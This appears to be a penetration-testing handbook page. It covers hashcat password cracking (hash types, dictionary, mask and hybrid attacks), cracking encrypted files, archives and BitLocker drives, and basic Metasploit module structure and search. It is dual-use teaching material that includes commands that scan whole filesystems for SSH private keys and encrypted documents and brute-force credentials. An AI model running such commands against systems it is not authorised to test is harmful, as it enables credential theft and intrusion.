<p>When passwords are stored in databases, they are often hashed to protect them from being easily read if the database is compromised. However, if an attacker can obtain the hash values, they can attempt to crack them using tools like Hashcat. Hashcat can read values from a wordlist, hash them, and compare them to the target hash values to find matches.</p>
<h2 id="hash-algorithms"><a class="header" href="#hash-algorithms">Hash Algorithms</a></h2>
<h3 id="sha-512"><a class="header" href="#sha-512">SHA-512</a></h3>
<p>SHA-512 (Secure Hash Algorithm 512-bit) is a member of the SHA-2 family of cryptographic hash functions. It produces a 512-bit (64-byte) hash value, typically represented as a 128-character hexadecimal string. SHA-512 is widely used for data integrity verification and digital signatures due to its strong security properties.</p>
<h3 id="blowfish"><a class="header" href="#blowfish">Blowfish</a></h3>
<p>Blowfish is a symmetric-key block cipher designed by Bruce Schneier in 1993. It operates on 64-bit blocks and supports key sizes ranging from 32 bits to 448 bits. Blowfish is known for its speed and effectiveness, making it a popular choice for encrypting data in various applications.</p>
<h3 id="bcrypt"><a class="header" href="#bcrypt">Bcrypt</a></h3>
<p>Bcrypt is a password hashing function designed to be computationally intensive to resist brute-force attacks. It incorporates a salt to protect against rainbow table attacks and allows for adjustable work factors, making it adaptable to increasing computational power over time. Bcrypt is widely used for securely storing passwords in databases.</p>
<h3 id="md5"><a class="header" href="#md5">MD5</a></h3>
<p>MD5 (Message-Digest Algorithm 5) is a widely used cryptographic hash function that produces a 128-bit (16-byte) hash value, typically represented as a 32-character hexadecimal string. Although it was once considered secure, MD5 is now vulnerable to collision attacks and is not recommended for security-sensitive applications.</p>
<h3 id="argon2"><a class="header" href="#argon2">Argon2</a></h3>
<p>Argon2 is a modern password hashing algorithm that won the Password Hashing Competition in 2015. It is designed to be resistant to GPU and ASIC attacks by being memory-intensive and computationally expensive. Argon2 has three variants: Argon2d, Argon2i, and Argon2id, each optimized for different security needs.</p>
<h2 id="hash-types"><a class="header" href="#hash-types">Hash Types</a></h2>
<p>Hashcat supports hundreds of different hash types, each assigned an ID. A list of associated IDs can be generated by running:</p>
<pre><code class="language-bash">hashcat --help
</code></pre>
<p>Common hash types:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>ID</th><th>Name</th><th>Category</th></tr>
</thead>
<tbody>
<tr><td><code>0</code></td><td>MD5</td><td>Raw Hash</td></tr>
<tr><td><code>100</code></td><td>SHA1</td><td>Raw Hash</td></tr>
<tr><td><code>500</code></td><td>MD5 Crypt / Cisco-IOS / FreeBSD MD5</td><td>Operating System</td></tr>
<tr><td><code>900</code></td><td>MD4</td><td>Raw Hash</td></tr>
<tr><td><code>1000</code></td><td>NTLM</td><td>Operating System</td></tr>
<tr><td><code>1300</code></td><td>SHA2-224</td><td>Raw Hash</td></tr>
<tr><td><code>1400</code></td><td>SHA2-256</td><td>Raw Hash</td></tr>
<tr><td><code>1700</code></td><td>SHA2-512</td><td>Raw Hash</td></tr>
<tr><td><code>1800</code></td><td>SHA-512 Crypt (Unix)</td><td>Operating System</td></tr>
<tr><td><code>3200</code></td><td>bcrypt</td><td>Operating System</td></tr>
<tr><td><code>5600</code></td><td>NetNTLMv2</td><td>Network Protocol</td></tr>
<tr><td><code>6000</code></td><td>RIPEMD-160</td><td>Raw Hash</td></tr>
<tr><td><code>10800</code></td><td>SHA2-384</td><td>Raw Hash</td></tr>
<tr><td><code>17300</code></td><td>SHA3-224</td><td>Raw Hash</td></tr>
<tr><td><code>17400</code></td><td>SHA3-256</td><td>Raw Hash</td></tr>
<tr><td><code>17500</code></td><td>SHA3-384</td><td>Raw Hash</td></tr>
<tr><td><code>17600</code></td><td>SHA3-512</td><td>Raw Hash</td></tr>
</tbody>
</table>
</div>
<p>The <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat website</a> hosts a comprehensive list of example hashes which can assist in manually identifying an unknown hash type.</p>
<h3 id="identifying-hash-types"><a class="header" href="#identifying-hash-types">Identifying Hash Types</a></h3>
<p>Use <code>hashid</code> to quickly identify the hashcat hash type by specifying the <code>-m</code> argument:</p>
<pre><code class="language-bash">hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'

Analyzing '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
[+] MD5 Crypt [Hashcat Mode: 500]
[+] Cisco-IOS(MD5) [Hashcat Mode: 500]
[+] FreeBSD MD5 [Hashcat Mode: 500]
</code></pre>
<h2 id="attack-modes"><a class="header" href="#attack-modes">Attack Modes</a></h2>
<p>Hashcat has many different attack modes, including dictionary, mask, combinator, and association.</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Mode</th><th>Name</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>0</code></td><td>Straight/Dictionary</td><td>Wordlist-based attack</td></tr>
<tr><td><code>1</code></td><td>Combination</td><td>Combines words from two wordlists</td></tr>
<tr><td><code>3</code></td><td>Brute-force/Mask</td><td>Uses masks to define keyspace</td></tr>
<tr><td><code>6</code></td><td>Hybrid Wordlist + Mask</td><td>Appends mask to wordlist entries</td></tr>
<tr><td><code>7</code></td><td>Hybrid Mask + Wordlist</td><td>Prepends mask to wordlist entries</td></tr>
</tbody>
</table>
</div>
<h3 id="dictionary-attack--a-0"><a class="header" href="#dictionary-attack--a-0">Dictionary Attack (<code>-a 0</code>)</a></h3>
<p>Dictionary attack is, as the name suggests, a dictionary attack. The user provides password hashes and a wordlist as input, and Hashcat tests each word in the list as a potential password until the correct one is found or the list is exhausted.</p>
<p><strong>Example:</strong> Cracking an MD5 hash using the rockyou.txt wordlist:</p>
<pre><code class="language-bash">hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
</code></pre>
<p><strong>Example output:</strong></p>
<pre><code>Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: e3e3ec5831ad5e7288241960e5d4fdb8
Time.Started.....: Sat Apr 19 08:58:44 2025 (0 secs)
Time.Estimated...: Sat Apr 19 08:58:44 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Speed.#1.........:  1706.6 kH/s (0.14ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 28672/14344385 (0.20%)
</code></pre>
<h3 id="using-rules"><a class="header" href="#using-rules">Using Rules</a></h3>
<p>A wordlist alone is often not enough to crack a password hash. Rules can be used to perform specific modifications to passwords to generate even more guesses. The rule files that come with hashcat are typically found under <code>/usr/share/hashcat/rules</code>:</p>
<pre><code class="language-bash">ls -l /usr/share/hashcat/rules
</code></pre>
<p>Common rule files:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Rule File</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>best64.rule</code></td><td>64 standard password modifications</td></tr>
<tr><td><code>rockyou-30000.rule</code></td><td>Large ruleset based on rockyou patterns</td></tr>
<tr><td><code>dive.rule</code></td><td>Comprehensive rule set</td></tr>
<tr><td><code>d3ad0ne.rule</code></td><td>Popular community ruleset</td></tr>
<tr><td><code>leetspeak.rule</code></td><td>Leet speak substitutions (e.g., a‚Üí4, e‚Üí3)</td></tr>
<tr><td><code>toggles1-5.rule</code></td><td>Case toggling rules</td></tr>
</tbody>
</table>
</div>
<p><strong>Example:</strong> Using best64.rule with a dictionary attack:</p>
<pre><code class="language-bash">hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
</code></pre>
<p>The <code>best64.rule</code> contains 64 standard password modifications‚Äîsuch as appending numbers or substituting characters with their ‚Äúleet‚Äù equivalents.</p>
<h3 id="mask-attack--a-3"><a class="header" href="#mask-attack--a-3">Mask Attack (<code>-a 3</code>)</a></h3>
<p>Mask attack is a type of brute-force attack in which the keyspace is explicitly defined by the user. For example, if we know that a password is eight characters long, rather than attempting every possible combination, we might define a mask that tests combinations of six letters followed by two numbers.</p>
<p>A mask is defined by combining a sequence of symbols, each representing a built-in or custom character set.</p>
<h4 id="built-in-character-sets"><a class="header" href="#built-in-character-sets">Built-in Character Sets</a></h4>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Symbol</th><th>Charset</th></tr>
</thead>
<tbody>
<tr><td><code>?l</code></td><td><code>abcdefghijklmnopqrstuvwxyz</code></td></tr>
<tr><td><code>?u</code></td><td><code>ABCDEFGHIJKLMNOPQRSTUVWXYZ</code></td></tr>
<tr><td><code>?d</code></td><td><code>0123456789</code></td></tr>
<tr><td><code>?h</code></td><td><code>0123456789abcdef</code></td></tr>
<tr><td><code>?H</code></td><td><code>0123456789ABCDEF</code></td></tr>
<tr><td><code>?s</code></td><td>Special characters: <code>¬´space¬ª!"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_</code>{</td></tr>
<tr><td><code>?a</code></td><td><code>?l?u?d?s</code> (all printable ASCII)</td></tr>
<tr><td><code>?b</code></td><td><code>0x00 - 0xff</code> (all bytes)</td></tr>
</tbody>
</table>
</div>
<h4 id="custom-character-sets"><a class="header" href="#custom-character-sets">Custom Character Sets</a></h4>
<p>Custom charsets can be defined with the <code>-1</code>, <code>-2</code>, <code>-3</code>, and <code>-4</code> arguments, then referred to with <code>?1</code>, <code>?2</code>, <code>?3</code>, and <code>?4</code>.</p>
<p><strong>Example:</strong> Password starting with uppercase, four lowercase, a digit, and a symbol:</p>
<pre><code class="language-bash"># Mask: ?u?l?l?l?l?d?s
hashcat -a 3 -m 0 hash.txt ?u?l?l?l?l?d?s
</code></pre>
<p><strong>Example:</strong> Custom charset (uppercase or lowercase letters):</p>
<pre><code class="language-bash">hashcat -a 3 -m 0 hash.txt -1 ?l?u ?1?1?1?1?d?d?d?d
</code></pre>
<p>This tries passwords with 4 mixed-case letters followed by 4 digits.</p>
<h3 id="hybrid-attacks"><a class="header" href="#hybrid-attacks">Hybrid Attacks</a></h3>
<h4 id="hybrid-wordlist--mask--a-6"><a class="header" href="#hybrid-wordlist--mask--a-6">Hybrid Wordlist + Mask (<code>-a 6</code>)</a></h4>
<p>Appends a mask to each word from the wordlist:</p>
<pre><code class="language-bash">hashcat -a 6 -m 0 hash.txt /usr/share/wordlists/rockyou.txt ?d?d?d
</code></pre>
<p>This tries each word from rockyou.txt with 3 digits appended (e.g., <code>password123</code>, <code>password456</code>).</p>
<h4 id="hybrid-mask--wordlist--a-7"><a class="header" href="#hybrid-mask--wordlist--a-7">Hybrid Mask + Wordlist (<code>-a 7</code>)</a></h4>
<p>Prepends a mask to each word from the wordlist:</p>
<pre><code class="language-bash">hashcat -a 7 -m 0 hash.txt ?d?d?d /usr/share/wordlists/rockyou.txt
</code></pre>
<p>This tries each word with 3 digits prepended (e.g., <code>123password</code>, <code>456password</code>).</p>
<h2 id="useful-options-1"><a class="header" href="#useful-options-1">Useful Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-o &lt;file&gt;</code></td><td>Output cracked hashes to a file</td></tr>
<tr><td><code>--show</code></td><td>Show previously cracked hashes from potfile</td></tr>
<tr><td><code>--status</code></td><td>Enable automatic status updates</td></tr>
<tr><td><code>--status-timer=N</code></td><td>Set status update interval (seconds)</td></tr>
<tr><td><code>-w 3</code></td><td>Workload profile (1=low, 2=default, 3=high, 4=nightmare)</td></tr>
<tr><td><code>--increment</code></td><td>Enable mask increment mode</td></tr>
<tr><td><code>--increment-min=N</code></td><td>Start mask length</td></tr>
<tr><td><code>--increment-max=N</code></td><td>End mask length</td></tr>
<tr><td><code>-O</code></td><td>Enable optimized kernels (faster, limits password length)</td></tr>
<tr><td><code>--username</code></td><td>Ignore username in hash file (format: <code>user:hash</code>)</td></tr>
<tr><td><code>--potfile-disable</code></td><td>Don‚Äôt write to potfile</td></tr>
<tr><td><code>--force</code></td><td>Ignore warnings</td></tr>
</tbody>
</table>
</div>
<h2 id="examples-7"><a class="header" href="#examples-7">Examples</a></h2>
<h3 id="crack-md5-hash-with-dictionary"><a class="header" href="#crack-md5-hash-with-dictionary">Crack MD5 hash with dictionary</a></h3>
<pre><code class="language-bash">hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt
</code></pre>
<h3 id="crack-ntlm-with-rules"><a class="header" href="#crack-ntlm-with-rules">Crack NTLM with rules</a></h3>
<pre><code class="language-bash">hashcat -a 0 -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
</code></pre>
<h3 id="brute-force-8-character-password-lowercase--digits"><a class="header" href="#brute-force-8-character-password-lowercase--digits">Brute-force 8-character password (lowercase + digits)</a></h3>
<pre><code class="language-bash">hashcat -a 3 -m 0 hash.txt ?l?l?l?l?l?l?d?d
</code></pre>
<h3 id="incremental-mask-attack-4-8-characters"><a class="header" href="#incremental-mask-attack-4-8-characters">Incremental mask attack (4-8 characters)</a></h3>
<pre><code class="language-bash">hashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a?a?a --increment --increment-min=4 --increment-max=8
</code></pre>
<h3 id="show-previously-cracked-passwords"><a class="header" href="#show-previously-cracked-passwords">Show previously cracked passwords</a></h3>
<pre><code class="language-bash">hashcat -m 0 hash.txt --show
</code></pre>
<h3 id="crack-bcrypt-hash"><a class="header" href="#crack-bcrypt-hash">Crack bcrypt hash</a></h3>
<pre><code class="language-bash">hashcat -a 0 -m 3200 bcrypt_hash.txt /usr/share/wordlists/rockyou.txt
</code></pre>
<hr>
<h2 id="cracking-protected-files-1"><a class="header" href="#cracking-protected-files-1">Cracking Protected Files</a></h2>
<p>The use of file encryption is often neglected in both private and professional contexts. Even today, emails containing job applications, account statements, or contracts are frequently sent without encryption. Nevertheless, encrypted files can still be cracked with the right combination of wordlists and tools.</p>
<p>In many cases, symmetric encryption algorithms such as AES-256 are used to securely store individual files or folders. For transmitting files, asymmetric encryption is typically employed, using two distinct keys: the sender encrypts with the recipient‚Äôs public key, and the recipient decrypts with the corresponding private key.</p>
<h3 id="hash-modes-for-protected-files"><a class="header" href="#hash-modes-for-protected-files">Hash Modes for Protected Files</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>ID</th><th>Type</th></tr>
</thead>
<tbody>
<tr><td><code>9400</code></td><td>MS Office 2007</td></tr>
<tr><td><code>9500</code></td><td>MS Office 2010</td></tr>
<tr><td><code>9600</code></td><td>MS Office 2013</td></tr>
<tr><td><code>10400</code></td><td>PDF 1.1-1.3 (Acrobat 2-4)</td></tr>
<tr><td><code>10500</code></td><td>PDF 1.4-1.6 (Acrobat 5-8)</td></tr>
<tr><td><code>10600</code></td><td>PDF 1.7 Level 3 (Acrobat 9)</td></tr>
<tr><td><code>10700</code></td><td>PDF 1.7 Level 8 (Acrobat 10-11)</td></tr>
<tr><td><code>13400</code></td><td>KeePass 1/2 AES/Twofish</td></tr>
<tr><td><code>22100</code></td><td>BitLocker</td></tr>
<tr><td><code>6211-6243</code></td><td>TrueCrypt</td></tr>
<tr><td><code>13711-13723</code></td><td>VeraCrypt</td></tr>
</tbody>
</table>
</div>
<h3 id="hunting-for-encrypted-files-1"><a class="header" href="#hunting-for-encrypted-files-1">Hunting for Encrypted Files</a></h3>
<p>Many different extensions correspond to encrypted files. Use this command to locate commonly encrypted files on a Linux system:</p>
<pre><code class="language-bash">for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*"); do
  echo -e "\nFile extension: " $ext
  find / -name *$ext 2&gt;/dev/null | grep -v "lib\|fonts\|share\|core"
done
</code></pre>
<h3 id="hunting-for-ssh-keys"><a class="header" href="#hunting-for-ssh-keys">Hunting for SSH Keys</a></h3>
<p>SSH private keys can be identified by their header content:</p>
<pre><code class="language-bash">grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2&gt;/dev/null
</code></pre>
<p>To check if an SSH key is encrypted:</p>
<pre><code class="language-bash">ssh-keygen -yf ~/.ssh/id_rsa
# If encrypted, prompts for passphrase
</code></pre>
<p>Note: SSH keys are typically cracked with John the Ripper using <code>ssh2john.py</code>, as hashcat doesn‚Äôt have a direct mode for SSH private keys.</p>
<hr>
<h2 id="cracking-protected-archives-1"><a class="header" href="#cracking-protected-archives-1">Cracking Protected Archives</a></h2>
<p>Besides standalone files, we often encounter password-protected archives such as ZIP files.</p>
<h3 id="hash-modes-for-archives"><a class="header" href="#hash-modes-for-archives">Hash Modes for Archives</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>ID</th><th>Type</th></tr>
</thead>
<tbody>
<tr><td><code>11600</code></td><td>7-Zip</td></tr>
<tr><td><code>13600</code></td><td>WinZip</td></tr>
<tr><td><code>17200</code></td><td>PKZIP (Compressed)</td></tr>
<tr><td><code>17210</code></td><td>PKZIP (Uncompressed)</td></tr>
<tr><td><code>17220</code></td><td>PKZIP (Compressed Multi-File)</td></tr>
<tr><td><code>17225</code></td><td>PKZIP (Mixed Multi-File)</td></tr>
<tr><td><code>17230</code></td><td>PKZIP (Compressed Multi-File Checksum-Only)</td></tr>
<tr><td><code>12500</code></td><td>RAR3-hp</td></tr>
<tr><td><code>13000</code></td><td>RAR5</td></tr>
<tr><td><code>23700</code></td><td>RAR3-p (Compressed)</td></tr>
<tr><td><code>23800</code></td><td>RAR3-p (Uncompressed)</td></tr>
</tbody>
</table>
</div>
<h3 id="cracking-bitlocker-encrypted-drives"><a class="header" href="#cracking-bitlocker-encrypted-drives">Cracking BitLocker-Encrypted Drives</a></h3>
<p>BitLocker is a full-disk encryption feature developed by Microsoft using AES with 128-bit or 256-bit keys. To crack a BitLocker encrypted drive, use <code>bitlocker2john</code> from the John the Ripper suite to extract hashes:</p>
<pre><code class="language-bash">bitlocker2john -i Backup.vhd &gt; backup.hashes
grep "bitlocker\$0" backup.hashes &gt; backup.hash
cat backup.hash
</code></pre>
<p>The script outputs four hashes: the first two are for the BitLocker password, the latter two for the recovery key. The recovery key is 48 digits and randomly generated, so focus on cracking the password hash (<code>$bitlocker$0$...</code>).</p>
<p>Crack with hashcat using mode 22100:</p>
<pre><code class="language-bash">hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f' /usr/share/wordlists/rockyou.txt
</code></pre>
<p>Example output:</p>
<pre><code>Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22100 (BitLocker)
Hash.Target......: $bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$10...8ec54f
Time.Started.....: Sat Apr 19 17:49:25 2025 (1 min, 56 secs)
Time.Estimated...: Sat Apr 19 17:51:21 2025 (0 secs)
Speed.#1.........:       25 H/s (9.28ms) @ Accel:64 Loops:4096 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2880/14344385 (0.02%)
Candidates.#1....: pirate -&gt; soccer9

$bitlocker$0$...:1234qwer
</code></pre>
<p>Note: BitLocker uses strong AES encryption, so cracking may take considerable time depending on hardware.</p>
<h3 id="mounting-bitlocker-drives-in-windows"><a class="header" href="#mounting-bitlocker-drives-in-windows">Mounting BitLocker Drives in Windows</a></h3>
<p>Double-click the <code>.vhd</code> file. Windows will show an error initially since it‚Äôs encrypted. After mounting, double-click the BitLocker volume to be prompted for the password.</p>
<h3 id="mounting-bitlocker-drives-in-linux"><a class="header" href="#mounting-bitlocker-drives-in-linux">Mounting BitLocker Drives in Linux</a></h3>
<p>Install <code>dislocker</code>:</p>
<pre><code class="language-bash">sudo apt-get install dislocker
</code></pre>
<p>Create mount directories:</p>
<pre><code class="language-bash">sudo mkdir -p /media/bitlocker
sudo mkdir -p /media/bitlockermount
</code></pre>
<p>Configure VHD as loop device, decrypt, and mount:</p>
<pre><code class="language-bash">sudo losetup -f -P Backup.vhd
sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
</code></pre>
<p>Browse the files:</p>
<pre><code class="language-bash">cd /media/bitlockermount/
ls -la
</code></pre>
<p>Unmount when done:</p>
<pre><code class="language-bash">sudo umount /media/bitlockermount
sudo umount /media/bitlocker
</code></pre>
<h3 id="cracking-openssl-encrypted-gzip-files"><a class="header" href="#cracking-openssl-encrypted-gzip-files">Cracking OpenSSL Encrypted GZIP Files</a></h3>
<p>Some archive formats don‚Äôt natively support password protection. Use the <code>file</code> command to identify OpenSSL encrypted files:</p>
<pre><code class="language-bash">file GZIP.gzip
# GZIP.gzip: openssl enc'd data with salted password
</code></pre>
<p>When cracking OpenSSL encrypted files with hashcat, you may encounter challenges including false positives. A more reliable approach is to use openssl within a loop:</p>
<pre><code class="language-bash">for i in $(cat rockyou.txt); do
  openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2&gt;/dev/null | tar xz
done
</code></pre>
<p>GZIP-related error messages can be safely ignored. When the correct password is found, the file is extracted to the current directory.</p>
<h3 id="collecting-archive-file-extensions"><a class="header" href="#collecting-archive-file-extensions">Collecting Archive File Extensions</a></h3>
<p>To get a comprehensive list of archive file types:</p>
<pre><code class="language-bash">curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="metasploit-framework"><a class="header" href="#metasploit-framework">Metasploit Framework</a></h1>
<p>Metasploit is a penetration testing framework that provides a collection of tools for developing and executing exploit code against remote targets. The framework consists of prepared scripts with specific purposes and corresponding functions that have been developed and tested in the wild.</p>
<h2 id="important-note-on-exploit-failures"><a class="header" href="#important-note-on-exploit-failures">Important Note on Exploit Failures</a></h2>
<p>Many people often think that the failure of an exploit disproves the existence of the suspected vulnerability. However, this is only proof that the Metasploit exploit does not work and <strong>not</strong> that the vulnerability does not exist. This is because many exploits require customization according to the target hosts to make the exploit work. Therefore, automated tools such as the Metasploit framework should only be considered a support tool and not a substitute for manual skills.</p>
<hr>
<h2 id="module-structure-1"><a class="header" href="#module-structure-1">Module Structure</a></h2>
<p>Each Metasploit module follows a structured naming convention:</p>
<pre><code>&lt;No.&gt; &lt;type&gt;/&lt;os&gt;/&lt;service&gt;/&lt;name&gt;
</code></pre>
<h3 id="example-7"><a class="header" href="#example-7">Example</a></h3>
<pre><code>794   exploit/windows/ftp/scriptftp_list
</code></pre>
<h3 id="components-explained"><a class="header" href="#components-explained">Components Explained</a></h3>
<ol>
<li><strong>Index No. (No.)</strong>: Displayed during searches to select specific modules later</li>
<li><strong>Type</strong>: First level of segregation between modules (see Module Types below)</li>
<li><strong>OS</strong>: Operating system and architecture the module targets</li>
<li><strong>Service</strong>: Vulnerable service running on target (or general activity for auxiliary/post modules)</li>
<li><strong>Name</strong>: Actual action that can be performed using the module</li>
</ol>
<hr>
<h2 id="module-types-1"><a class="header" href="#module-types-1">Module Types</a></h2>
<h3 id="interactable-modules-can-use-use-no"><a class="header" href="#interactable-modules-can-use-use-no">Interactable Modules (Can use <code>use &lt;no.&gt;</code>)</a></h3>
<p>These modules can be directly used with the <code>use</code> command:</p>
<h4 id="auxiliary"><a class="header" href="#auxiliary">Auxiliary</a></h4>
<ul>
<li><strong>Purpose</strong>: Scanning, fuzzing, sniffing, and admin capabilities</li>
<li><strong>Description</strong>: Offer extra assistance and functionality</li>
<li><strong>Example</strong>: <code>auxiliary/scanner/smb/smb_ms17_010</code> - SMB vulnerability scanner</li>
</ul>
<h4 id="exploits"><a class="header" href="#exploits">Exploits</a></h4>
<ul>
<li><strong>Purpose</strong>: Exploit vulnerabilities to allow payload delivery</li>
<li><strong>Description</strong>: Defined as modules that exploit a vulnerability</li>
<li><strong>Example</strong>: <code>exploit/windows/smb/ms17_010_psexec</code> - MS17-010 EternalRomance exploit</li>
</ul>
<h4 id="post"><a class="header" href="#post">Post</a></h4>
<ul>
<li><strong>Purpose</strong>: Information gathering, pivoting deeper into networks</li>
<li><strong>Description</strong>: Wide array of modules for post-exploitation activities</li>
<li><strong>Example</strong>: <code>post/windows/gather/credentials</code> - Gather Windows credentials</li>
</ul>
<h3 id="non-interactable-modules-support-modules"><a class="header" href="#non-interactable-modules-support-modules">Non-Interactable Modules (Support modules)</a></h3>
<p>These modules support the interactable ones but cannot be directly used:</p>
<h4 id="encoders-1"><a class="header" href="#encoders-1">Encoders</a></h4>
<ul>
<li><strong>Purpose</strong>: Ensure payloads are intact to their destination</li>
<li><strong>Description</strong>: Encode payloads to evade detection and filters</li>
</ul>
<h4 id="nops-no-operation-code"><a class="header" href="#nops-no-operation-code">NOPs (No Operation code)</a></h4>
<ul>
<li><strong>Purpose</strong>: Keep payload sizes consistent across exploit attempts</li>
<li><strong>Description</strong>: Used to maintain consistent buffer sizes</li>
</ul>
<h4 id="payloads"><a class="header" href="#payloads">Payloads</a></h4>
<ul>
<li><strong>Purpose</strong>: Code that runs remotely and calls back to attacker machine</li>
<li><strong>Description</strong>: Establishes connection (or shell) back to attacker</li>
<li><strong>Example</strong>: <code>windows/meterpreter/reverse_tcp</code> - Reverse TCP Meterpreter payload</li>
</ul>
<h4 id="plugins"><a class="header" href="#plugins">Plugins</a></h4>
<ul>
<li><strong>Purpose</strong>: Additional scripts integrated within msfconsole</li>
<li><strong>Description</strong>: Extend functionality and coexist with other modules</li>
</ul>
<hr>
<h2 id="searching-for-modules"><a class="header" href="#searching-for-modules">Searching for Modules</a></h2>
<p>Metasploit offers a well-developed search function to quickly find suitable modules for targets.</p>
<h3 id="basic-search-syntax"><a class="header" href="#basic-search-syntax">Basic Search Syntax</a></h3>
<pre><code class="language-bash">search [&lt;options&gt;] [&lt;keywords&gt;:&lt;value&gt;]
</code></pre>
<h3 id="search-options-1"><a class="header" href="#search-options-1">Search Options</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-h</code></td><td>Show help information</td></tr>
<tr><td><code>-o &lt;file&gt;</code></td><td>Send output to a file in CSV format</td></tr>
<tr><td><code>-S &lt;string&gt;</code></td><td>Regex pattern used to filter search results</td></tr>
<tr><td><code>-u</code></td><td>Use module if there is one result</td></tr>
<tr><td><code>-s &lt;search_column&gt;</code></td><td>Sort results based on column in ascending order</td></tr>
<tr><td><code>-r</code></td><td>Reverse the search results order to descending order</td></tr>
</tbody>
</table>
</div>
<h3 id="search-keywords-1"><a class="header" href="#search-keywords-1">Search Keywords</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Keyword</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>aka</code></td><td>Modules with matching AKA (also-known-as) name</td></tr>
<tr><td><code>author</code></td><td>Modules written by this author</td></tr>
<tr><td><code>arch</code></td><td>Modules affecting this architecture</td></tr>
<tr><td><code>bid</code></td><td>Modules with matching Bugtraq ID</td></tr>
<tr><td><code>cve</code></td><td>Modules with matching CVE ID</td></tr>
<tr><td><code>edb</code></td><td>Modules with matching Exploit-DB ID</td></tr>
<tr><td><code>check</code></td><td>Modules that support the ‚Äòcheck‚Äô method</td></tr>
<tr><td><code>date</code></td><td>Modules with matching disclosure date</td></tr>
<tr><td><code>description</code></td><td>Modules with matching description</td></tr>
<tr><td><code>fullname</code></td><td>Modules with matching full name</td></tr>
<tr><td><code>mod_time</code></td><td>Modules with matching modification date</td></tr>
<tr><td><code>name</code></td><td>Modules with matching descriptive name</td></tr>
<tr><td><code>path</code></td><td>Modules with matching path</td></tr>
<tr><td><code>platform</code></td><td>Modules affecting this platform</td></tr>
<tr><td><code>port</code></td><td>Modules with matching port</td></tr>
<tr><td><code>rank</code></td><td>Modules with matching rank (descriptive like ‚Äògood‚Äô or numeric with operators like ‚Äògte400‚Äô)</td></tr>
<tr><td><code>ref</code></td><td>Modules with matching ref</td></tr>
<tr><td><code>reference</code></td><td>Modules with matching reference</td></tr>
<tr><td><code>target</code></td><td>Modules affecting this target</td></tr>
<tr><td><code>type</code></td><td>Modules of specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)</td></tr>
</tbody>
</table>
</div>
<h3 id="supported-search-columns-for-sorting"><a class="header" href="#supported-search-columns-for-sorting">Supported Search Columns (for sorting)</a></h3>
<ul>
<li><code>rank</code> - Sort by exploitability rank</li>
<li><code>date</code> / <code>disclosure_date</code> - Sort by disclosure date</li>
<li><code>name</code> - Sort by module name</li>
<li><code>type</code> - Sort by module type</li>
<li><code>check</code> - Sort by whether they have a check method</li>
</ul>
<h3 id="search-examples"><a class="header" href="#search-examples">Search Examples</a></h3>
<h4 id="simple-search"><a class="header" href="#simple-search">Simple Search</a></h4>
<pre><code class="language-bash">msf6 &gt; search eternalromance
</code></pre>
<h4 id="filtered-search"><a class="header" href="#filtered-search">Filtered Search</a></h4>
<pre><code class="language-bash">msf6 &gt; search eternalromance type:exploit
</code></pre>
<h4 id="complex-search"><a class="header" href="#complex-search">Complex Search</a></h4>
<pre><code class="language-bash">msf6 &gt; search type:exploit platform:windows cve:2021 rank:excellent microsoft
</code></pre>
<p>This searches for:</p>
<ul>
<li>Exploit modules</li>
<li>Targeting Windows platform</li>
<li>Related to CVEs from 2021</li>
<li>With excellent rank</li>
<li>Containing ‚Äúmicrosoft‚Äù in the name/description</li>
</ul>
<h4 id="excluding-results"><a class="header" href="#excluding-results">Excluding Results</a></h4>
<p>Prepend a value with <code>-</code> to exclude matching results:</p>
<pre><code class="language-bash">msf6 &gt; search cve:2009 type:exploit platform:-linux
</code></pre>
<hr>
